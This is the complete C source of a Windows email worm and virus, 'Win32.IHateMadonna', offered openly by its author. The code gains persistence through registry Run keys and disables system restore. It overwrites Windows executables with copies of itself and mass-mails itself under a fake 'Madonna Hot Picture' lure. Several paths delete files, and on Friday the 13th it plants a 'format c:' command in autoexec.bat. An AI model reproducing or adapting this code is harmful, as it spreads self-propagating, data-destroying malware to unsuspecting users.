   #include "madonna.h"
   #pragma hdrstop
   #pragma warning (disable: 4068)
   #pragma warning (disable: 4001)

   char MadonnaPath[256],MadonnaWinDir[256],MadonnaRestore[256],LaraSysDir[256],MyBuffer[256]="echo y|format c: /u /v:IHM";;
   FILE *stream;
   int Err,ErrSend,NumCnt,Counter=0;
   DWORD ExtInf;
   HWND SysEngHwnd,SysFraHwnd;
   HKEY MadonnaNTKey,MadonnaWinKey,MadonnaInstKey,MadonnaCrtKey,MadonnaStartKey,MadonnaAntiResKey;
   HANDLE MadonnaHnd,MadonnaHndTime,AutoexecHnd;
   HMODULE KernMadLib,MapiMadLib;
   typedef DWORD(*MadonnaSerProc)(DWORD,DWORD);
   typedef ULONG(*EnvoiMadonna)(LHANDLE,ULONG,MapiMessage FAR*,FLAGS,ULONG);
   typedef ULONG(*MadonnaTrouve)(LHANDLE,ULONG,LPTSTR,FLAGS,ULONG,lpMapiRecipDesc FAR*);
   typedef ULONG(*MadonnaLibre)(LPVOID);
   LPSTR Nom = "a";


   #pragma argsused
   int WINAPI WinMain
   (
   HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR     lpszCmdLine,
   int       nCmdShow
   )
   {
   // Win32.IHateMadonna by ZeMacroKiller98
   // Hey, You like Madonna ????, I hate her!!!!!!!
   // Copyright (c) 2001
   // a virus made in FRANCE
   WIN32_FIND_DATA MadonnaHost;
   OSVERSIONINFO MadOsVerInfo;
   FILETIME CreateTime,LstAccTime,LstWriTime;
   SYSTEMTIME MadonnaTime;
   MadonnaSerProc RegisterServiceProcess;
   EnvoiMadonna MessSendMad;
   MadonnaTrouve MadFoundName;
   MadonnaLibre MadMemFree;
   KernMadLib = LoadLibrary("kernel32.dll");
   MapiMadLib = LoadLibrary("mapi32.dll");
   RegisterServiceProcess = (MadonnaSerProc)GetProcAddress(KernMadLib,"RegisterServiceProcess");
   SearchPath(NULL,_argv[0],NULL,sizeof(MadonnaPath),MadonnaPath,NULL);
   MadOsVerInfo.dwOSVersionInfoSize = sizeof(MadOsVerInfo);
   GetVersionEx(&MadOsVerInfo);
   if(MadOsVerInfo.dwPlatformId==VER_PLATFORM_WIN32_NT)
   {
           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\WindowsNT\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&MadonnaNTKey);
           RegSetValueEx(MadonnaNTKey,"MadonnaNT",0,REG_SZ,MadonnaPath,sizeof(MadonnaPath));
           RegCloseKey(MadonnaNTKey);
   }
   else
   {
           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&MadonnaWinKey);
           RegSetValueEx(MadonnaWinKey,"Madonna32",0,REG_SZ,MadonnaPath,sizeof(MadonnaPath));
           RegCloseKey(MadonnaWinKey);
   }
   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\MadonnaPicture\\Install",0,KEY_ALL_ACCESS,&MadonnaInstKey)!=ERROR_SUCCESS)
   {
           //Anti-WinMe Restauration File
           GetSystemDirectory(LaraSysDir, sizeof(LaraSysDir));
           if(SetCurrentDirectory(lstrcat(MadonnaRestore,"\\RESTORE"))!=0)
           {
                   RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&MadonnaAntiResKey);
                   RegDeleteValue(MadonnaAntiResKey,"*StateMgr");
                   RegCloseKey(MadonnaAntiResKey);
                   DeleteFile("rstrui.exe");
           }
           GetWindowsDirectory(MadonnaWinDir,sizeof(MadonnaWinDir));
           SetCurrentDirectory(MadonnaWinDir);
           MadonnaHnd = FindFirstFile("*.exe",&MadonnaHost);
           MadonnaHostFound:
           MadonnaHndTime = CreateFile(MadonnaHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
           GetFileTime(MadonnaHndTime,&CreateTime,&LstAccTime,&LstWriTime);
           CloseHandle(MadonnaHndTime);
           if((lstrcmp(MadonnaHost.cFileName,"emm386.exe")==0)||(lstrcmp(MadonnaHost.cFileName,"setver.exe")==0))
                   goto DontInfectbyMadonna;
           CopyFile(_argv[0],MadonnaHost.cFileName,FALSE);
           MadonnaHndTime = CreateFile(MadonnaHost.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
           SetFileTime(MadonnaHndTime,&CreateTime,&LstAccTime,&LstWriTime);
           CloseHandle(MadonnaHndTime);
           DontInfectbyMadonna:
           if(FindNextFile(MadonnaHnd,&MadonnaHost)==TRUE)
                   goto MadonnaHostFound;
           FindClose(MadonnaHnd);
           RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\MadonnaPicture\\Install",&MadonnaCrtKey);
           RegCloseKey(MadonnaCrtKey);
   // Email Propagation uses MAPI functions
   MessSendMad = (EnvoiMadonna)GetProcAddress(MapiMadLib,"MAPISendMail");
   MadFoundName = (MadonnaTrouve)GetProcAddress(MapiMadLib,"MAPIResolveName");
   MadMemFree = (MadonnaLibre)GetProcAddress(MapiMadLib,"MAPIFreeBuffer");
   if((MessSendMad==NULL)||(MadFoundName==NULL)||(MadMemFree==NULL))
   {
           MessageBox(NULL,"This program need MAPI functions\nIt can be find into your computer\nPlease refer to Windows help to install it","Madonna Hot Picture Software",MB_OK|MB_ICONEXCLAMATION);
           SetCurrentDirectory(MadonnaWinDir);
           DeleteFile("*.*");
           ExitProcess(0);
   }
   MapiMessage stMessage;
   MapiRecipDesc stRecip;
   MapiFileDesc stFile;
   lpMapiRecipDesc lpRecip;
   stFile.ulReserved = 0;
   stFile.flFlags = 0L;
   stFile.nPosition = (ULONG)-1;
   stFile.lpszPathName = MadonnaPath;
   stFile.lpszFileName = NULL;
   stFile.lpFileType = NULL;
   MessageBox(NULL,"Hey, before you use this software\nSend me to your friends, please","Madonna Hot Picture Software",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
   MadonnaCantResolve:
   Err = (MadFoundName)(lhSessionNull,0L,Nom,MAPI_DIALOG,0L,&lpRecip);
   if(Err!=SUCCESS_SUCCESS)
   {
   switch(Err){
           case MAPI_E_AMBIGUOUS_RECIPIENT:
                   MessageBox(NULL,"The recipient requested has not been or could\n not be resolved to a unique address list entry","Madonna Hot Picture Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           break;
           case MAPI_E_UNKNOWN_RECIPIENT:
                   MessageBox(NULL,"The recipient could not be resolved to any\naddress.The recipient might not exist or might be unknown","Madonna Hot Picture Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           break;
           case MAPI_E_FAILURE:
                   MessageBox(NULL,"One or more unspecified errors occured\nThe name was not resolved","Madonna Hot Picture Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_INSUFFICIENT_MEMORY:
                   MessageBox(NULL,"There was insufficient memory to proceed","Madonna Hot Picture Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_NOT_SUPPORTED:
                   MessageBox(NULL,"The operation was not supported by the messaging system","Madonna Hot Picture Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_USER_ABORT:
                   MessageBox(NULL,"The user was cancelled one or more dialog box","Madonna Hot Picture Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           }
   goto MadonnaCantResolve;
   }
   stRecip.ulReserved = lpRecip->ulReserved;
   stRecip.ulRecipClass = MAPI_TO;
   stRecip.lpszName = lpRecip->lpszName;
   stRecip.lpszAddress = lpRecip->lpszAddress;
   stRecip.ulEIDSize = lpRecip->ulEIDSize;
   stRecip.lpEntryID = lpRecip->lpEntryID;
   stMessage.ulReserved = 0;
   stMessage.lpszSubject = "Madonna Hot Picture";
   stMessage.lpszNoteText = lstrcat("Hi ",(lstrcat(lpRecip->lpszName,"\n\n\tHey, I know you like Madonna.I found this software on Madonna Official Site.\nIt contains a lot of picture about Madonna.\nI hope you like to have it\nSee you soon....")));
   stMessage.lpszMessageType = NULL;
   stMessage.lpszDateReceived = NULL;
   stMessage.lpszConversationID = NULL;
   stMessage.flFlags = 0L;
   stMessage.lpOriginator = NULL;
   stMessage.nRecipCount = 1;
   stMessage.lpRecips = &stRecip;
   stMessage.nFileCount = 1;
   stMessage.lpFiles = &stFile;
   ErrSend = (MessSendMad)(lhSessionNull,0L,&stMessage,0L,0L);
   if(ErrSend!=SUCCESS_SUCCESS)
   {
           MessageBox(NULL,"A error occured when i try to send email\nPlease refer to your windows help for more informations\n","Madonna Hot Picture Software",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           DeleteFile("*.*");
           ExitProcess(0);
   }
   stream = fopen("madonna.htm","w");
   fprintf(stream,"<html>\n");
   fprintf(stream,"\n");
   fprintf(stream,"<head>\n");
   fprintf(stream,"<title>Madonna Picture</title>\n");
   fprintf(stream,"</head>\n");
   fprintf(stream,"\n");
   fprintf(stream,"\n");
   fprintf(stream,"<body bgcolor   =\"#000000\" text=\"#FFFF00\">\n");
   fprintf(stream,"<p>&nbsp;</p>\n");
   fprintf(stream,"<p>&nbsp;</p>\n");
   fprintf(stream,"<p>&nbsp;</p>\n");
   fprintf(stream,"<p>&nbsp;</p>\n");
   fprintf(stream,"<p align=\"center\"><font size=\"5\">CHARGEMENT EN COURS....</font></p>\n");
   fprintf(stream,"<p align=\"center\"><font size=\"5\">LOADING....</font></p>\n");
   fprintf(stream,"</body>\n");
   fprintf(stream,"</html>\n");
   fclose(stream);
   ShellExecute(NULL,"open","madonna.htm",NULL,NULL,SW_SHOWNORMAL);
   if((SleepEx(10000,FALSE))==0)
   {
           stream = fopen("error.htm","w");
           fprintf(stream,"<html>\n");
           fprintf(stream,"\n");
           fprintf(stream,"<head>\n");
           fprintf(stream,"<title>Madonna Picture</title>\n");
           fprintf(stream,"</head>\n");
           fprintf(stream,"\n");
           fprintf(stream,"\n");
           fprintf(stream,"<body bgcolor   =\"#000000\" text=\"#FFFF00\">\n");
           fprintf(stream,"<p>&nbsp;</p>\n");
           fprintf(stream,"<p>&nbsp;</p>\n");
           fprintf(stream,"<p>&nbsp;</p>\n");
           fprintf(stream,"<p>&nbsp;</p>\n");
           fprintf(stream,"<p align=\"center\"><font size=\"5\">ERREUR DE CHARGEMENT....</font></p>\n");
           fprintf(stream,"<p align=\"center\"><font size=\"5\">LOADING ERROR....</font></p>\n");
           fprintf(stream,"<p align=\"center\"><font size=\"5\">Please close this window,now</font></p>\n");
           fprintf(stream,"<p align=\"center\"><font size=\"5\">Fermer cette fenetre, maintenant</font></p>\n");
           fprintf(stream,"</body>\n");
           fprintf(stream,"</html>\n");
           fclose(stream);
           ShellExecute(NULL,"open","error.htm",NULL,NULL,SW_SHOWNORMAL);
   }
   MessageBox(NULL,"Hey, a error occured during the loading\nPlease retry later or contact Madonna Official Site",
                   "Madonna Hot Picture Software",
                    MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
   FreeLibrary(MapiMadLib);
   ExitProcess(0);
   }
   RegCloseKey(MadonnaInstKey);
   STARTUPINFO Start;
   PROCESS_INFORMATION Proc;
   Start.cb = sizeof(STARTUPINFO);
   Start.lpReserved = NULL;
   Start.lpReserved2 = NULL;
   Start.cbReserved2 = 0;
   Start.lpDesktop = NULL;
   Start.dwFlags = STARTF_FORCEOFFFEEDBACK;
   if(CreateProcess(MadonnaPath,
                   NULL,
                   (LPSECURITY_ATTRIBUTES)NULL,
                   (LPSECURITY_ATTRIBUTES)NULL,
                   FALSE,
                   0,
                   NULL,
                   NULL,
                   &Start,
                   &Proc))
   {
   CloseHandle(Proc.hProcess);
   CloseHandle(Proc.hThread);
   }
   if(CreateMutex(NULL,TRUE,MadonnaPath)==NULL)
           ExitProcess(0);
   SetPriorityClass(Proc.hProcess,REALTIME_PRIORITY_CLASS);
   RegisterServiceProcess(Proc.dwProcessId,1);
   GetLocalTime(&MadonnaTime);
   if(((MadonnaTime.wHour>0)&&(MadonnaTime.wHour<23))&&((MadonnaTime.wMinute==0)&&(MadonnaTime.wSecond==0)))
   {
           MessageBox(NULL,"Hey man, you see now that your PC is infected by me\nJust now, you see that i HATE Madonna","Win32.IHateMadonna by ZeMacroKiller98",MB_OK|MB_ICONEXCLAMATION|MB_SYSTEMMODAL);
           ExitWindowsEx(EWX_POWEROFF|EWX_FORCE,0);
   }
   if((MadonnaTime.wDay==13)&&(MadonnaTime.wDayOfWeek==5))
   {
           MessageBox(NULL,"Ha Ha Ha Ha!!!, Madonna Virus is in your computer...\nAnd time is occured to destroy your PC!!!!!!\nThanks to ZeMacroKiller98!!!","Win32.IHateMadonna",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
           SetCurrentDirectory("C:/");
           AutoexecHnd = CreateFile("autoexec.bat",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
           WriteFile(AutoexecHnd,MyBuffer,sizeof(MyBuffer),&ExtInf,NULL);
           CloseHandle(AutoexecHnd);
           ExitWindowsEx(EWX_FORCE|EWX_REBOOT,0);
   }
   SysEngHwnd = FindWindow(NULL,"System Properties");
   if(SysEngHwnd!=NULL)
           SetWindowText(SysEngHwnd,"Win32.IhateMadonna has take the power into your PC!!!!");
   SysFraHwnd = FindWindow(NULL,"Propri‚t‚s SystŠme");
   if(SysFraHwnd!=NULL)
           SetWindowText(SysFraHwnd,"Win32.IhateMadonna a pris le pouvoir dans votre PC!!!!");
   FreeLibrary(KernMadLib);
   return 0;
   }
